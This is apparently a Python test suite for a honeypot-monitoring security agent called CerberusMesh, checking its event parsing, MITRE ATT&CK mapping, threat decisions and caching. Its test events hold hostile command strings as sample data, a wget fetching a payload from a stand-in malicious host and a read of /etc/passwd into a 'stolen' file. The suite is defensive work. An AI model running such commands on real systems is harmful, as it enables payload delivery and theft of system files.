#!/usr/bin/env python3
"""
Test script for CerberusMesh Cerberus Agent

This script tests the basic functionality of the agent without requiring
full infrastructure deployment.
"""

import asyncio
import json
import logging
import os
import sys
from datetime import datetime
from pathlib import Path

# Add parent directory to path for imports
sys.path.append(str(Path(__file__).parent))

from cerberus_agent import CerberusAgent, IntrusionEvent

# Configure test logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class MockAgentTest:
    """Test suite for Cerberus Agent."""
    
    def __init__(self):
        """Initialize test environment."""
        self.test_config = {
            "openai_api_key": None,  # Will be mocked
            "llm_model": "gpt-4",
            "llm_temperature": 0.2,
            "aws_region": "us-east-1",
            "redis_host": "localhost",
            "redis_port": 6379,
            "redis_db": 1,
            "decision_threshold": 0.7,
            "max_events_per_minute": 100,
            "auto_action_enabled": False,  # Disable auto-actions for testing
            "decoy_launch_threshold": 0.8,
            "event_sources": ["test"],
            "monitoring_interval": 1,
            "cache_ttl": 300,
        }
    
    async def run_tests(self):
        """Run all agent tests."""
        logger.info("Starting Cerberus Agent tests...")
        
        try:
            # Test 1: Agent initialization
            await self.test_agent_initialization()
            
            # Test 2: Event creation and parsing
            await self.test_event_creation()
            
            # Test 3: MITRE mapping
            await self.test_mitre_mapping()
            
            # Test 4: Decision making (without LLM)
            await self.test_decision_making()
            
            # Test 5: Cache operations
            await self.test_cache_operations()
            
            # Test 6: Configuration loading
            await self.test_configuration()
            
            logger.info("✅ All tests completed successfully!")
            
        except Exception as e:
            logger.error(f"❌ Test failed: {e}")
            raise
    
    async def test_agent_initialization(self):
        """Test agent initialization."""
        logger.info("Testing agent initialization...")
        
        agent = CerberusAgent(config=self.test_config)
        
        # Check basic properties
        assert hasattr(agent, 'config')
        assert hasattr(agent, 'event_queue')
        assert hasattr(agent, 'mitre_mapper')
        assert agent.events_processed == 0
        assert agent.decisions_made == 0
        
        # Check status
        status = agent.get_agent_status()
        assert 'is_running' in status
        assert 'config' in status
        assert 'components' in status
        
        logger.info("✅ Agent initialization test passed")
    
    async def test_event_creation(self):
        """Test intrusion event creation."""
        logger.info("Testing event creation...")
        
        # Create test event
        event = IntrusionEvent(
            event_id="test-001",
            timestamp=datetime.now(),
            honeypot_id="honeypot-01",
            source_ip="192.168.1.100",
            event_type="login_attempt",
            protocol="ssh",
            destination_port=22,
            session_id="sess-123",
            username="admin",
            password="password123",
            severity="medium"
        )
        
        # Validate event properties
        assert event.event_id == "test-001"
        assert event.source_ip == "192.168.1.100"
        assert event.event_type == "login_attempt"
        assert event.username == "admin"
        
        logger.info("✅ Event creation test passed")
    
    async def test_mitre_mapping(self):
        """Test MITRE ATT&CK mapping."""
        logger.info("Testing MITRE mapping...")
        
        agent = CerberusAgent(config=self.test_config)
        
        # Create test event
        event = IntrusionEvent(
            event_id="test-002",
            timestamp=datetime.now(),
            honeypot_id="honeypot-01",
            source_ip="10.0.0.50",
            event_type="command_execution",
            protocol="ssh",
            destination_port=22,
            session_id="sess-456",
            command="wget http://malicious.com/payload.sh"
        )
        
        # Test MITRE enrichment
        mitre_mapping = await agent._enrich_with_mitre(event)
        
        # Validate mapping
        assert mitre_mapping is not None
        assert hasattr(mitre_mapping, 'ioc_value')
        assert mitre_mapping.ioc_value == event.source_ip
        assert hasattr(mitre_mapping, 'attack_pattern')
        
        logger.info("✅ MITRE mapping test passed")
    
    async def test_decision_making(self):
        """Test decision making without LLM."""
        logger.info("Testing decision making...")
        
        agent = CerberusAgent(config=self.test_config)
        
        # Create high-threat event
        event = IntrusionEvent(
            event_id="test-003",
            timestamp=datetime.now(),
            honeypot_id="honeypot-01",
            source_ip="1.2.3.4",
            event_type="file_upload",
            protocol="ssh",
            destination_port=22,
            session_id="sess-789",
            command="cat /etc/passwd > /tmp/stolen.txt",
            severity="high"
        )
        
        # Create mock threat context
        mitre_mapping = await agent._enrich_with_mitre(event)
        llm_analysis = agent._fallback_analysis(event)
        
        from cerberus_agent import ThreatContext
        threat_context = ThreatContext(
            event=event,
            mitre_mapping=mitre_mapping,
            llm_analysis=llm_analysis,
            threat_score=0.85,
            behavioral_patterns=["data_exfiltration"],
            recommendations=["escalate"]
        )
        
        # Make decision
        decision = await agent._make_decision(threat_context)
        
        # Validate decision
        assert decision is not None
        assert hasattr(decision, 'decision_type')
        assert hasattr(decision, 'confidence')
        assert decision.event_id == event.event_id
        
        logger.info(f"✅ Decision made: {decision.decision_type} (confidence: {decision.confidence:.2f})")
    
    async def test_cache_operations(self):
        """Test cache operations."""
        logger.info("Testing cache operations...")
        
        agent = CerberusAgent(config=self.test_config)
        
        # Test data caching and retrieval
        test_data = {"test": "value", "number": 42}
        agent._cache_data("test_key", test_data, ttl=60)
        
        retrieved_data = agent._get_cached_data("test_key")
        
        # Note: This might fail if Redis is not available, which is expected
        if retrieved_data:
            assert retrieved_data["test"] == "value"
            assert retrieved_data["number"] == 42
            logger.info("✅ Cache operations test passed (Redis available)")
        else:
            logger.info("✅ Cache operations test passed (Redis not available - using fallback)")
    
    async def test_configuration(self):
        """Test configuration loading."""
        logger.info("Testing configuration...")
        
        agent = CerberusAgent(config=self.test_config)
        
        # Check configuration values
        assert agent.config["decision_threshold"] == 0.7
        assert agent.config["llm_model"] == "gpt-4"
        assert agent.config["auto_action_enabled"] == False
        
        # Check threat patterns
        patterns = agent.threat_patterns
        assert "brute_force" in patterns
        assert "port_scanning" in patterns
        assert "command_injection" in patterns
        
        logger.info("✅ Configuration test passed")

async def main():
    """Main test runner."""
    print("CerberusMesh Cerberus Agent Test Suite")
    print("=" * 50)
    
    # Check if we're in the right directory
    if not Path("cerberus_agent.py").exists():
        print("❌ Error: cerberus_agent.py not found in current directory")
        print("Please run this script from the agent/ directory")
        sys.exit(1)
    
    # Run tests
    test_suite = MockAgentTest()
    
    try:
        await test_suite.run_tests()
        print("\n🎉 All tests passed! The Cerberus Agent is ready for deployment.")
        
    except Exception as e:
        print(f"\n💥 Tests failed: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())
